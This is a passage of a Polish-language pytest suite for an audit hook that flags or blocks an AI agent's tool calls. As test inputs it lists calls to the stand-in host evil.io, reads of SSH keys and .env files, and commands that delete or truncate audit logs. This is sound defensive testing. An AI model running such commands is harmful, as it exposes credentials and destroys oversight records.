    assert flagi_analizy(ah, cwd, katalog, narzedzie, wejscie, **pola) == sorted(po)


def wywolaj(tmp_path, repo, narzedzie, wejscie, blokady=BLOKADY, **pola):
    """Jedno wywołanie przez `przetworz` → (ostatni wiersz dziennika, decyzja odmowy albo None)."""
    dane = {"session_id": "s1", "cwd": str(repo), "tool_name": narzedzie, "tool_input": wejscie}
    plik, odmowa = ah.przetworz(
        json.dumps({**dane, **pola}), tmp_path / "audyt", HOSTY, TERAZ, blokady
    )
    return json.loads(plik.read_text(encoding="ascii").splitlines()[-1]), odmowa


def wejscie_dla(narzedzie: str, sciezka: str) -> dict:
    if narzedzie == "NotebookEdit":
        return {"notebook_path": sciezka}
    if narzedzie == "Grep":
        return {"pattern": "BEGIN", "path": sciezka}
    if narzedzie == "Glob":
        return {"pattern": sciezka}
    return {"file_path": sciezka}


def uruchom_main(surowe: bytes, katalog: Path) -> tuple[int, bytes]:
    """`main(["hook"])` w procesie testu: stdin/stdout podmienione (z `.buffer`), katalog audytu
    w `katalog`."""
    wejscie = io.TextIOWrapper(io.BytesIO(surowe))
    wyjscie = io.TextIOWrapper(io.BytesIO(), encoding="ascii")
    with (
        mock.patch.object(sys, "stdin", wejscie),
        mock.patch.object(sys, "stdout", wyjscie),
        mock.patch.dict(os.environ, {"CLAS5_AUDYT_DIR": str(katalog)}),
    ):
        kod = ah.main(["hook"])
    return kod, wyjscie.buffer.getvalue()


def _bez_dat(wartosc):
    """PyYAML robi z `2026-10-06` datę, hook trzyma tekst — do porównania data → tekst."""
    if isinstance(wartosc, dict):
        return {k: _bez_dat(v) for k, v in wartosc.items()}
    if isinstance(wartosc, list):
        return [_bez_dat(v) for v in wartosc]
    if isinstance(wartosc, (date, datetime)):
        return wartosc.isoformat()
    return wartosc


def blokady_wg_pyyaml(tekst: str) -> tuple:
    """Wzorzec: ten sam tekst przez PyYAML i te same reguły wpisu (`ah._blokada`). PyYAML pada →
    brak blokad (zepsuty YAML nie blokuje)."""
    import yaml

    try:
        dokument = yaml.safe_load(tekst)
    except Exception:  # YAMLError, a przy niemożliwej dacie także ValueError
        return ()
    if not isinstance(dokument, dict) or not isinstance(dokument.get("blokuj"), list):
        return ()
    return tuple(b for b in map(ah._blokada, _bez_dat(dokument["blokuj"])) if b is not None)


def test_old_hook_for_before_after_is_loaded_when_commit_exists(stary):
    """Bez tego część „przed” testów przed/po mogłaby się po cichu nie wykonać."""
    jest = subprocess.run(
        ["git", "-C", str(ROOT), "cat-file", "-e", f"{STARY_COMMIT}^{{commit}}"],
        capture_output=True,
    )
    if jest.returncode != 0:
        pytest.skip("brak commita sprzed zadania 029 (płytki klon)")
    assert stary is not None and hasattr(stary, "analizuj") and not hasattr(stary, "przetworz")


# R1 — numer deskryptora (`2>&1`) to nie nazwa zdalnego repo -----------------------------------
@pytest.mark.parametrize(
    ("polecenie", "przed"),
    [
        ("git pull -q 2>&1 | tail -2", [ah.F_SIEC_NIEZNANY]),  # H1 z tygodnia
        ("git push -q 2>&1 | tail -1", [ah.F_SIEC_NIEZNANY]),
        ("git fetch 2>/dev/null; git status -sb", [ah.F_SIEC_NIEZNANY]),
        ("git push > log.txt", [ah.F_SIEC_NIEZNANY]),  # cel przekierowania to nie zdalne repo
        ("git push origin master 2>&1", []),
    ],
)
def test_r1_fd_number_and_redirect_are_not_a_remote(
    tmp_path, repo_git, stary, monkeypatch, polecenie, przed
):
    wejscie = {"command": polecenie}
    przed_po(stary, monkeypatch, repo_git, tmp_path / "audyt", "Bash", wejscie, przed, [])


def test_r1_push_to_unlisted_host_is_still_flagged(tmp_path):
    zly = tmp_path / "zly"
    zly.mkdir()
    _git(zly, "init", "-q")
    _git(zly, "remote", "add", "origin", "https://evil.io/x.git")
    for polecenie in ("git push 2>&1 | tail -1", "git push -q origin HEAD 2>/dev/null"):
        rekord = bash(tmp_path, zly, polecenie)
        assert rekord["flagi"] == [ah.F_SIEC] and rekord["hosty_spoza_listy"] == ["evil.io"]
    rekord = bash(tmp_path, zly, "git push https://gitlab.com/x/y.git HEAD 2>&1")
    assert rekord["flagi"] == [ah.F_SIEC] and rekord["hosty_spoza_listy"] == ["gitlab.com"]


def test_r1_tokenizer_drops_only_glued_fd_numbers():
    assert ah.segmenty("git pull -q 2>&1 | tail -2") == [["git", "pull", "-q"], ["tail", "-2"]]
    assert ah.segmenty("python x.py 2>/dev/null") == [["python", "x.py", ">", "/dev/null"]]
    assert ah.segmenty("cat 0<plik") == [["cat", "<", "plik"]]
    assert ah.segmenty("echo 2 > x") == [["echo", "2", ">", "x"]]  # z odstępem: argument
    assert ah.segmenty('echo "2">x') == [["echo", "2", ">", "x"]]  # w cudzysłowie: słowo
    assert ah.segmenty("echo a2>x") == [["echo", "a2", ">", "x"]]


# R2 — treść heredoka to dane ------------------------------------------------------------------
def test_r2_task_card_heredoc_is_data(tmp_path, repo, dom, stary, monkeypatch):
    katalog = tmp_path / "audyt"
    karta = (  # P1: karta zadania o izolacji, pisana heredokiem, wspomina klucz i katalog audytu
        "cat > zadania/004-x.md <<'EOF'\n---\nid: 004\n"
        f"Wykonawca nie czyta ~/.ssh/likwidacje_deploy ani {katalog}/2026-09-29.jsonl\nEOF"
    )
    przed_po(stary, monkeypatch, repo, katalog, "Bash", {"command": karta}, [ah.F_AUDYT, P], [])


@pytest.mark.parametrize(
    ("polecenie", "przed"),
    [
        (  # H4: notatka do pamięci z linią `git push` i adresem w treści
            "cat > notatka.md <<'EOF'\n---\nname: push-osobna-komenda\ngit push origin master\n"
            "curl -s https://evil.io/x\nEOF",
            [ah.F_SIEC_NIEZNANY, ah.F_SIEC],
        ),
        (  # Z5: `x > 0,` w kodzie Pythona wzięte za zapis do pliku `0,`
            "cd /srv && python3 - <<'EOF'\nwynik = [x for x in dane if x > 0, 1]\nEOF",
            [ah.F_ZAPIS],
        ),
        ("python3 - <<'EOF'\nfor k in sc.keys():\n    print(k)\nEOF", [P]),  # P3: `sc.keys`
        ("python3 - <<'EOF'\nprzyklady = ['echo x > ~/.ssh/klucz']\nEOF", [P]),  # P2: test hooka
    ],
)
def test_r2_heredoc_body_is_not_commands_nor_paths(
    tmp_path, repo, dom, stary, monkeypatch, polecenie, przed
):
    przed_po(
        stary, monkeypatch, repo, tmp_path / "audyt", "Bash", {"command": polecenie}, przed, []
    )


@pytest.mark.parametrize(
    ("polecenie", "flagi"),
    [
        ("cat > x.md <<'EOF'\ntekst\nEOF\ncurl -s https://evil.io/x", [ah.F_SIEC]),
        ("curl -s https://evil.io/x -d @- <<'EOF'\ndane\nEOF", [ah.F_SIEC]),
        ("python3 - <<'EOF'\nimport requests\nrequests.get('https://evil.io/x')\nEOF", [ah.F_SIEC]),
        ("bash <<'EOF'\ncurl -s https://evil.io/x\nEOF", [ah.F_SIEC]),  # powłoka czyta heredoc
        ("cat <<'EOF' | sh\ncat ~/.ssh/id_rsa\nEOF", [P]),
        ('cat <<< "x"\necho y > /srv/a.txt', [ah.F_ZAPIS]),  # here-string to nie heredoc
        ("# komentarz << EOF\necho y > /srv/a.txt", [ah.F_ZAPIS]),
        ("echo $((1<<2))\necho y > /srv/a.txt", [ah.F_ZAPIS]),
        ("cat <<-EOF > /srv/b.txt\n\tx ~/.ssh/id_rsa\n\tEOF\necho ok", [ah.F_ZAPIS]),
    ],
)
def test_r2_real_events_around_heredocs_are_still_flagged(tmp_path, repo, dom, polecenie, flagi):
    assert bash(tmp_path, repo, polecenie)["flagi"] == flagi


def test_bez_heredokow_cuts_bodies_and_keeps_operator():
    assert ah.bez_heredokow("cat > a.md <<'EOF'\nlinia 1\nlinia 2\nEOF\necho ok") == (
        "cat > a.md <<'EOF'\necho ok",
        ["linia 1\nlinia 2"],
    )
    assert ah.bez_heredokow("cat <<A <<-B\na\nA\n\tb\n\tB\nkoniec") == (
        "cat <<A <<-B\nkoniec",
        ["a", "\tb"],
    )
    assert ah.bez_heredokow("echo '<<EOF'\nx") == ("echo '<<EOF'\nx", [])
    assert ah.bez_heredokow("git commit -m \"$(cat <<'EOF'\nx\nEOF\n)\"")[1] == []
    assert ah.bez_heredokow("cat <<< x\ny") == ("cat <<< x\ny", [])
    assert ah.bez_heredokow("python3 - <<EOF\nbez końca") == ("python3 - <<EOF\n", ["bez końca"])
    assert ah.bez_heredokow("cat <<'E\nx") == ("cat <<'E\nx", [])  # niedomknięty: nie heredoc


# R3 — słowo z nową linią to nie ścieżka --------------------------------------------------------
@pytest.mark.parametrize(
    "polecenie",
    [  # P2: wieloliniowy kod `python -c`; opis commita z `"$(cat <<'EOF' … EOF)"`
        "python3 -c \"import os\nprint(os.path.exists('~/.ssh/id_ed25519'))\"",
        "git commit -q -m \"$(cat <<'EOF'\nOpis: ~/.ssh/klucz bez zmian\nEOF\n)\"",
    ],
)
def test_r3_multiline_word_is_not_a_path(tmp_path, repo, dom, stary, monkeypatch, polecenie):
    przed_po(stary, monkeypatch, repo, tmp_path / "audyt", "Bash", {"command": polecenie}, [P], [])


@pytest.mark.parametrize(
    "polecenie",
    [
        "cat ~/.ssh/id_ed25519",
        "python3 -c \"print(open('~/.ssh/config').read())\"",  # jedna linia: dalej widać
        # reszta z tygodnia (P2, 1 wiersz): JSON z `~/.ssh/…` w jednym słowie — dalej oznaczony
        'for j in \'{"tool_name":"Read","tool_input":{"file_path":"~/.ssh/id_ed25519"}}\'; '
        'do echo "$j"; done',
    ],
)
def test_r3_single_line_credential_paths_in_bash_are_flagged_not_denied(
    tmp_path, repo, dom, polecenie
):
    rekord, odmowa = wywolaj(tmp_path, repo, "Bash", {"command": polecenie})
    assert rekord["flagi"] == [P] and odmowa is None and "zablokowano" not in rekord


# R4 — `$NAZWA` z prostego przypisania w tym samym poleceniu ------------------------------------
def test_r4_assigned_scratchpad_variable_is_expanded(tmp_path, repo, stary, monkeypatch):
    polecenie = f"cd /srv && S={SCRATCHPAD}; cat > $S/merge017.txt <<'EOF'\nMerge: zad. 017\nEOF"
    wejscie = {"command": polecenie}  # Z4 z tygodnia: cel w scratchpadzie przez `$S`
    przed_po(stary, monkeypatch, repo, tmp_path / "audyt", "Bash", wejscie, [ah.F_ZAPIS], [])


def test_r4_cd_into_assigned_directory_resolves_remote(
    tmp_path, repo, repo_git, stary, monkeypatch
):
    wejscie = {"command": f"W={repo_git}; cd $W; git fetch -q origin"}  # H5 z tygodnia
    przed_po(
        stary, monkeypatch, repo, tmp_path / "audyt", "Bash", wejscie, [ah.F_SIEC_NIEZNANY], []
    )


def test_r4_unexpanded_variable_gives_no_write_outside_repo(tmp_path, repo, stary, monkeypatch):
    wejscie = {"command": "cd /srv && cat > $NIEZNANA/x.txt <<'EOF'\nx\nEOF"}
    przed_po(stary, monkeypatch, repo, tmp_path / "audyt", "Bash", wejscie, [ah.F_ZAPIS], [])


@pytest.mark.parametrize(
    ("polecenie", "flagi"),
    [
        ("S=/srv/wspolny; echo x > $S/kanal.txt", [ah.F_ZAPIS]),  # przed R4 niewidoczne
        ("export S=/srv/wspolny && echo x > ${S}/kanal.txt", [ah.F_ZAPIS]),
        ("export K=~/.ssh; cat $K/config", [P]),
        (f"S={TMP_TESTOWY}/wspolny; echo x > $S/kanal.txt", [ah.F_TMP]),
        ("S=$(mktemp -d); echo x > $S/kanal.txt", []),  # wartość nieznana: `$S` nierozwinięte
    ],
)
def test_r4_expansion_also_reveals_real_writes(tmp_path, repo, dom, polecenie, flagi):
    assert bash(tmp_path, repo, polecenie)["flagi"] == flagi


def test_rozwin_zmienne_expands_known_names_only(dom):
    wynik = ah.rozwin_zmienne("$S/a ${S}/b $SS/c $HOME/d $INNA", {"S": "/tmp/x"})
    assert wynik == f"/tmp/x/a /tmp/x/b $SS/c {dom}/d $INNA"


# R5 — własny scratchpad sesji bez flagi ---------------------------------------------------------
def test_r5_own_scratchpad_is_not_flagged(tmp_path, repo, stary, monkeypatch):
    katalog = tmp_path / "audyt"
    plik = {"file_path": f"{SCRATCHPAD}/czas.py"}
    przed_po(stary, monkeypatch, repo, katalog, "Write", plik, [ah.F_TMP], [])
    przed_po(stary, monkeypatch, repo, katalog, "Write", plik, [ah.F_TMP], [], agent_id="a1")
    heredok = {"command": f"cat > {SCRATCHPAD}/czas.py <<'EOF'\nprint(1)\nEOF"}  # T1 z tygodnia
    przed_po(stary, monkeypatch, repo, katalog, "Bash", heredok, [ah.F_TMP], [])


@pytest.mark.parametrize(
    "sciezka",
    [
        f"{TMP_TESTOWY}/claude-1000/-home-x-alpha/s2/scratchpad/x.py",  # scratchpad innej sesji
        f"{TMP_TESTOWY}/claude-1000/-home-x-alpha/s1/inne/x.py",  # obok scratchpadu
        f"{TMP_TESTOWY}/wspolny.txt",
        f"{TMP_TESTOWY}/s1/scratchpad/x.py",  # bez `claude-<uid>/<projekt>/`
    ],
)
def test_r5_rest_of_tmp_is_still_flagged(tmp_path, repo, sciezka):
    assert uruchom(tmp_path, repo, "Write", {"file_path": sciezka})["flagi"] == [ah.F_TMP]


@pytest.mark.parametrize("sesja", [None, "", "..", "s1/../s2", "a" * 200])
def test_r5_odd_session_id_gives_no_exemption(sesja):
    sciezka = f"{TMP_TESTOWY}/claude-1000/p/{sesja}/scratchpad/x"
    assert not ah.wlasny_scratchpad(sciezka, sesja)


# R6 — katalogi Claude Code ----------------------------------------------------------------------
def test_r6_main_session_memory_and_plans_are_not_flagged(tmp_path, repo, dom, stary, monkeypatch):
    katalog = tmp_path / "audyt"
    pamiec = {"file_path": "~/.claude/projects/-home-x-alpha/memory/nota-przekazania.md"}  # Z1
    przed_po(stary, monkeypatch, repo, katalog, "Write", pamiec, [ah.F_ZAPIS], [])
    dopisz = {"command": "cat >> ~/.claude/projects/-home-x-alpha/memory/MEMORY.md <<'EOF'\nx\nEOF"}
    przed_po(stary, monkeypatch, repo, katalog, "Bash", dopisz, [ah.F_ZAPIS], [])
    plan = {"file_path": "~/.claude/plans/plan.md"}  # Z2: także subagent
    przed_po(stary, monkeypatch, repo, katalog, "Write", plan, [ah.F_ZAPIS], [])
    przed_po(stary, monkeypatch, repo, katalog, "Write", plan, [ah.F_ZAPIS], [], agent_id="a1")


def test_r6_subagent_writing_memory_is_still_flagged(tmp_path, repo, dom):
    pamiec = "~/.claude/projects/-home-x-alpha/memory/nota.md"
    zapis = uruchom(tmp_path, repo, "Write", {"file_path": pamiec}, agent_id="a1")
    polecenie = {"command": f"cat >> {pamiec} <<'EOF'\nx\nEOF"}
    dopisanie = uruchom(tmp_path, repo, "Bash", polecenie, agent_id="a1")
    assert zapis["flagi"] == [ah.F_ZAPIS] and dopisanie["flagi"] == [ah.F_ZAPIS]


@pytest.mark.parametrize(
    "sciezka",
    [
        "~/.claude/settings.json",
        "~/.claude/projects/-home-x-alpha/inne.md",
        "~/.claude/projects/memory/x.md",
    ],
)
def test_r6_other_claude_paths_are_still_flagged(tmp_path, repo, dom, sciezka):
    assert uruchom(tmp_path, repo, "Write", {"file_path": sciezka})["flagi"] == [ah.F_ZAPIS]


# R7 — format `blokuj:` --------------------------------------------------------------------------
def test_shipped_config_blocks_exactly_the_two_user_decisions():
    assert BLOKADY == (
        ah.Blokada(P, frozenset(PLIKOWE), "2026-10-06"),
        ah.Blokada(Z, None, "2026-10-06"),
    )
    assert ah.wczytaj_blokady() == BLOKADY  # domyślnie plik z repo


def test_shipped_config_is_inside_subset_and_matches_pyyaml():
    tekst = (ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8")
    assert ah.yaml_podzbior(tekst) is not None and "\t" not in tekst
    assert BLOKADY == blokady_wg_pyyaml(tekst)


def test_environment_variables_do_not_switch_blocks(tmp_path, monkeypatch):
    """Decyzja „Wszędzie”: żadna zmienna środowiskowa nie wyłącza blokad (także ta od hostów)."""
    pusty = tmp_path / "pusty.yaml"
    pusty.write_text("hosty: []\nblokuj: []\n", encoding="utf-8")
    monkeypatch.setenv("CLAS5_AUDYT_HOSTY", str(pusty))
    monkeypatch.setenv("CLAS5_AUDYT_DIR", str(tmp_path / "audyt"))
    assert ah.wczytaj_hosty() == frozenset() and ah.wczytaj_blokady() == BLOKADY


@pytest.mark.parametrize(
    ("tekst", "oczekiwane"),
    [
        ("blokuj:\n  - poswiadczenia\n", [ah.Blokada(P)]),
        ("blokuj:\n- poswiadczenia\n- dziennik_audytu_zapis\n", [ah.Blokada(P), ah.Blokada(Z)]),
        ("blokuj: [poswiadczenia, dziennik_audytu_zapis]\n", [ah.Blokada(P), ah.Blokada(Z)]),
        (
            "blokuj:\n  - {flaga: poswiadczenia, narzedzia: [Read, Grep]}\n",
            [ah.Blokada(P, frozenset({"Read", "Grep"}))],
        ),
        (
            "blokuj:\n  - flaga: poswiadczenia\n    narzedzia:\n      - Read\n      - Write\n",
            [ah.Blokada(P, frozenset({"Read", "Write"}))],
        ),
        (
            "blokuj:\n  - flaga: poswiadczenia\n    narzedzia:\n    - Read\n",
            [ah.Blokada(P, frozenset({"Read"}))],
        ),
        (
            "blokuj:\n  -   flaga: 'poswiadczenia'  # komentarz\n      decyzja: \"2026-10-06\"\n",
            [ah.Blokada(P, None, "2026-10-06")],
        ),
        (
            "blokuj:\n  - flaga: poswiadczenia\n    decyzja: 2026-10-06\n",
            [ah.Blokada(P, None, "2026-10-06")],
        ),
        ("blokuj:\n  -\n    flaga: dziennik_audytu_zapis\n", [ah.Blokada(Z)]),
        # zły wpis niczego nie blokuje, reszta działa
        ("blokuj:\n  - nieznana_flaga\n  - poswiadczenia\n", [ah.Blokada(P)]),
        ("blokuj:\n  - blad_analizy\n  - wejscie_nieczytelne\n", []),  # błąd hooka: nigdy
        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: [read]}\n", []),
        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: [Read, WebSearch]}\n", []),
        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: []}\n", []),
        ("blokuj:\n  - {flaga: poswiadczenia, narzedzia: Read}\n", []),
        ("blokuj:\n  - {flaga: poswiadczenia, narzedzie: [Read]}\n", []),  # literówka w kluczu
        ("blokuj:\n  - {narzedzia: [Read]}\n", []),
        ("blokuj:\n  - {flaga: poswiadczenia, decyzja: wczoraj}\n", []),
        ("blokuj:\n  - {flaga: poswiadczenia, decyzja: '2026-13-45'}\n", []),
        ("blokuj:\n  - [poswiadczenia]\n  - dziennik_audytu_zapis\n", [ah.Blokada(Z)]),
        ("blokuj:\n  - ~\n  - yes\n  - 1\n  - ''\n", []),
        # brak listy, pusta lista (ścieżka odwrotu)
        ("blokuj: []\n", []),
        ("blokuj:\n", []),
        ("blokuj: poswiadczenia\n", []),
        ("blokuj: {flaga: poswiadczenia}\n", []),
        ("", []),
    ],
)
def test_block_entries_match_pyyaml(tekst, oczekiwane):
    pelny = NAGLOWEK + tekst
    assert list(ah.parsuj_blokady(pelny)) == oczekiwane
    assert list(blokady_wg_pyyaml(pelny)) == oczekiwane


@pytest.mark.parametrize(
    "tekst",
    [
        "blokuj:\n  - poswiadczenia\n  - [dziennik_audytu_zapis\n",  # niedomknięty nawias
        "blokuj:\n\t- poswiadczenia\n",  # tabulator
        "blokuj:\n  - poswiadczenia\n - dziennik_audytu_zapis\n",  # złe wcięcie
        "blokuj:\n  - poswiadczenia\n  dziennik_audytu_zapis\n",
        "blokuj:\n  - poswiadczenia\nblokuj:\n  - dziennik_audytu_zapis\n",  # powtórzony klucz
        "blokuj:\n  - flaga: poswiadczenia\n    decyzja: 2026-13-45\n",  # YAML pada na dacie
        "blokuj:\n  - 'poswiadczenia\n",  # niedomknięty apostrof
        "blokuj:\n  - &a poswiadczenia\n  - *a\n",  # kotwice: poza podzbiorem
        "blokuj:\n  - |\n    poswiadczenia\n",  # skalar blokowy: poza podzbiorem
        "---\nblokuj:\n  - poswiadczenia\n",  # znacznik dokumentu: poza podzbiorem
        "\ufeffblokuj:\n  - poswiadczenia\n",  # BOM w środku tekstu
        "blokuj:\n  - poswiadczenia\x0b\n",  # znak sterujący
        "blokuj:\n  - 0x_\n  - poswiadczenia\n",  # YAML pada: liczba bez cyfr
    ],
)
def test_broken_or_unsupported_yaml_blocks_nothing(tekst):
    assert ah.parsuj_blokady(NAGLOWEK + tekst) == ()


def test_missing_or_unreadable_config_blocks_nothing(tmp_path):
    assert ah.wczytaj_blokady(tmp_path / "brak.yaml") == ()
    zly = tmp_path / "zly.yaml"
    zly.write_bytes(b"blokuj:\n  - poswiadczenia\n\xff\xfe\n")
    assert ah.wczytaj_blokady(zly) == ()


def test_windows_file_with_bom_and_crlf_reads_like_unix(tmp_path):
    tekst = (ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8")
    plik = tmp_path / "audyt_hosty.yaml"
    plik.write_bytes(b"\xef\xbb\xbf" + tekst.replace("\n", "\r\n").encode("utf-8"))
    assert ah.wczytaj_blokady(plik) == BLOKADY


def test_rollback_empty_list_returns_hook_to_flagging_only(tmp_path, repo, dom):
    tekst = (ROOT / "config" / "audyt_hosty.yaml").read_text(encoding="utf-8")
    blokady = ah.parsuj_blokady(tekst.partition("\nblokuj:")[0] + "\nblokuj: []\n")
    rekord, odmowa = wywolaj(tmp_path, repo, "Read", {"file_path": "~/.ssh/id_ed25519"}, blokady)
    assert blokady == () and rekord["flagi"] == [P] and odmowa is None
    assert "zablokowano" not in rekord


def test_blocked_flags_respect_tool_scope_and_never_hook_errors():
    blokady = (ah.Blokada(P, frozenset({"Read"})), ah.Blokada(Z), ah.Blokada(ah.F_BLAD))
    assert ah.zablokowane_flagi({P, Z}, "Read", blokady) == [Z, P]
    assert ah.zablokowane_flagi({P}, "Bash", blokady) == []
    assert ah.zablokowane_flagi({ah.F_BLAD, ah.F_WEJSCIE}, "Bash", blokady) == []


# R8 i blokada zapisu do katalogu audytu ----------------------------------------------------------
@pytest.mark.parametrize("narzedzie", ["Write", "Edit", "MultiEdit", "NotebookEdit"])
def test_r8_write_tools_into_audit_dir_are_denied(tmp_path, repo, narzedzie):
    sciezka = str(tmp_path / "audyt" / "2026-10-06.jsonl")
    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie_dla(narzedzie, sciezka))
    assert Z in rekord["flagi"] and ah.F_AUDYT not in rekord["flagi"]
    assert rekord["zablokowano"] == [Z]
    assert odmowa["hookSpecificOutput"]["permissionDecision"] == "deny"


@pytest.mark.parametrize(
    "szablon",
    [
        "echo x >> {k}/a.jsonl",  # przykład z karty zadania
        "echo x | tee -a {k}/a.jsonl",
        "cp /dev/null {k}/a.jsonl",
        "sed -i d {k}/a.jsonl",
        "rm -f {k}/a.jsonl",
        "mv {k}/a.jsonl /srv/kopia.jsonl",
        "truncate -s 0 {k}/a.jsonl",
        "ln -sf /dev/null {k}/a.jsonl",
        "find {k} -name '*.jsonl' -delete",
        "find {k} -type f -exec rm {{}} +",
        "chmod 000 {k}",
        "dd if=/dev/null of={k}/a.jsonl",
        "A={k}; echo x > $A/b.jsonl",  # R4 + R8
        "cd {k} && rm a.jsonl",
        "bash -c 'rm {k}/a.jsonl'",
    ],
)
def test_r8_bash_changing_audit_dir_is_denied(tmp_path, repo, szablon):
    polecenie = szablon.format(k=tmp_path / "audyt")
    rekord, odmowa = wywolaj(tmp_path, repo, "Bash", {"command": polecenie})
    assert Z in rekord["flagi"] and rekord["zablokowano"] == [Z], polecenie
    assert odmowa["hookSpecificOutput"]["permissionDecision"] == "deny", polecenie


@pytest.mark.parametrize(
    ("narzedzie", "wejscie"),
    [
        ("Read", {"file_path": "{k}/2026-10-05.jsonl"}),
        ("Grep", {"pattern": "flagi", "path": "{k}"}),
        ("Glob", {"pattern": "{k}/*.jsonl"}),
        ("Bash", {"command": "cat {k}/2026-10-05.jsonl | jq -r '.flagi[]' | sort | uniq -c"}),
        ("Bash", {"command": "cp {k}/2026-10-05.jsonl kopia.jsonl"}),
        ("Bash", {"command": "wc -l {k}/2026-10-05.jsonl > podsumowanie.txt"}),
    ],
)
def test_r8_reading_audit_dir_is_flagged_not_denied(tmp_path, repo, narzedzie, wejscie):
    wejscie = {pole: w.format(k=tmp_path / "audyt") for pole, w in wejscie.items()}
    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie)
    assert ah.F_AUDYT in rekord["flagi"] and Z not in rekord["flagi"]
    assert odmowa is None and "zablokowano" not in rekord


# blokada `poswiadczenia` w narzędziach plikowych ------------------------------------------------
@pytest.mark.parametrize("narzedzie", PLIKOWE)
@pytest.mark.parametrize(
    "sciezka",
    [
        "~/.ssh/id_ed25519",
        "~/.ssh",
        "/srv/klucze/binance.pem",
        ".env",
        "C:\\Users\\x\\.ssh\\id_rsa",  # Windows: ocena czysto tekstowa
        "C:/Users/x/.aws/credentials",
    ],
)
def test_credentials_in_file_tools_are_denied(tmp_path, repo, dom, narzedzie, sciezka):
    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie_dla(narzedzie, sciezka))
    assert P in rekord["flagi"] and rekord["zablokowano"] == [P]
    powod = odmowa["hookSpecificOutput"]["permissionDecisionReason"]
    assert powod.startswith("poswiadczenia: ") and powod.endswith("decyzja użytkownika 2026-10-06")


@pytest.mark.parametrize(
    "polecenie",
    [
        "cat ~/.ssh/id_ed25519",
        "ls -la ~/.ssh",
        "grep -r TOKEN .env",
        "cat 'C:\\Users\\x\\.ssh\\id_rsa'",
    ],
)
def test_credentials_in_bash_are_only_flagged(tmp_path, repo, dom, polecenie):
    rekord, odmowa = wywolaj(tmp_path, repo, "Bash", {"command": polecenie})
    assert P in rekord["flagi"] and odmowa is None and "zablokowano" not in rekord


@pytest.mark.parametrize(
    ("narzedzie", "wejscie"),
    [
        ("Read", {"file_path": "tools/zuzycie_tokenow.py"}),
        ("Read", {"file_path": "README.md"}),
        ("Grep", {"pattern": "api_key", "path": "tools"}),
        ("Glob", {"pattern": "**/*.py"}),
        ("Write", {"file_path": "runs/x/README.md"}),
        ("WebFetch", {"url": "https://github.com/x", "prompt": "p"}),
    ],
)
def test_ordinary_calls_are_not_denied(tmp_path, repo, narzedzie, wejscie):
    rekord, odmowa = wywolaj(tmp_path, repo, narzedzie, wejscie)
    assert rekord["flagi"] == [] and odmowa is None


def test_deny_output_format_and_reason_without_content_or_secrets(tmp_path, repo):
    wejscie = {"file_path": "/srv/klucze/token=hunter2xyz.pem", "content": "TAJNA-TRESC"}
    rekord, odmowa = wywolaj(tmp_path, repo, "Write", wejscie)
    assert set(odmowa) == {"hookSpecificOutput"}
    wyjscie = odmowa["hookSpecificOutput"]
    assert wyjscie["hookEventName"] == "PreToolUse" and wyjscie["permissionDecision"] == "deny"
    assert set(wyjscie) == {"hookEventName", "permissionDecision", "permissionDecisionReason"}
    powod = wyjscie["permissionDecisionReason"]
    assert powod.startswith("poswiadczenia: plik z poświadczeniami (") and "Write" in powod
    assert powod.endswith("; decyzja użytkownika 2026-10-06")
    tekst = json.dumps(odmowa) + json.dumps(rekord)
    assert "TAJNA-TRESC" not in tekst and "hunter2xyz" not in tekst


def test_two_blocked_flags_give_one_decision_with_both_reasons(tmp_path, repo):
    sciezka = str(tmp_path / "audyt" / "id_rsa")
    rekord, odmowa = wywolaj(tmp_path, repo, "Write", {"file_path": sciezka})
    assert rekord["zablokowano"] == [Z, P]
    powod = odmowa["hookSpecificOutput"]["permissionDecisionReason"]
    assert powod.count("decyzja użytkownika 2026-10-06") == 2 and " | " in powod


# fail-open ------------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "cel", ["analizuj", "wczytaj_blokady", "zablokowane_flagi", "decyzja_odmowy"]
)
def test_own_error_anywhere_in_decision_fails_open(tmp_path, repo, dom, monkeypatch, cel):
    def pada(*_a, **_k):
        raise RuntimeError("x")

    monkeypatch.setattr(ah, cel, pada)
    dane = {"cwd": str(repo), "tool_name": "Read", "tool_input": {"file_path": "~/.ssh/id_rsa"}}
    plik, odmowa = ah.przetworz(json.dumps(dane), tmp_path / "audyt", HOSTY, TERAZ, None)
    rekord = json.loads(plik.read_text(encoding="ascii").splitlines()[-1])
    assert odmowa is None and rekord["flagi"] == [ah.F_BLAD] and "zablokowano" not in rekord


@pytest.mark.parametrize("wejscie", [b"", b"{zly json", b"[1, 2]", b"\xff\xfe", b"null"])
def test_bad_input_never_denies(tmp_path, wejscie):
    plik, odmowa = ah.przetworz(wejscie, tmp_path / "audyt", HOSTY, TERAZ, BLOKADY)
    assert odmowa is None and json.loads(plik.read_text(encoding="ascii"))["flagi"] == [
        ah.F_WEJSCIE
    ]


def test_log_write_failure_keeps_computed_denial(tmp_path, repo, dom):
    """Zepsuty katalog audytu nie zdejmuje blokady: decyzja nie zależy od zapisu dziennika."""
    zajety = tmp_path / "plik"
    zajety.write_text("x", encoding="utf-8")
    dane = {"cwd": str(repo), "tool_name": "Read", "tool_input": {"file_path": "~/.ssh/id_rsa"}}
    plik, odmowa = ah.przetworz(json.dumps(dane), zajety / "audyt", HOSTY, TERAZ, BLOKADY)
    assert plik is None and odmowa["hookSpecificOutput"]["permissionDecision"] == "deny"


@pytest.mark.parametrize("kodowanie", [None, "ascii", "cp1252"])
def test_script_denies_credential_read_with_json_on_stdout(tmp_path, kodowanie):
    """Prawdziwy proces z konfiguracją z repo: kod 0, na stdout JSON odmowy w ASCII (także przy
    wąskim kodowaniu stdout, jak cp1252 na Windows) i jeden wiersz dziennika z `zablokowano`."""
    env = dict(os.environ, CLAS5_AUDYT_DIR=str(tmp_path / "audyt"))
    if kodowanie:
        env["PYTHONIOENCODING"] = kodowanie
    dane = {
        "tool_name": "Read",
        "tool_input": {"file_path": "/x/.ssh/id_rsa"},
        "cwd": str(tmp_path),
    }
    wynik = subprocess.run(
        [sys.executable, str(SKRYPT), "hook"],
        input=json.dumps(dane).encode(),
        capture_output=True,
        env=env,
        timeout=30,
    )
    assert wynik.returncode == 0 and wynik.stderr == b""
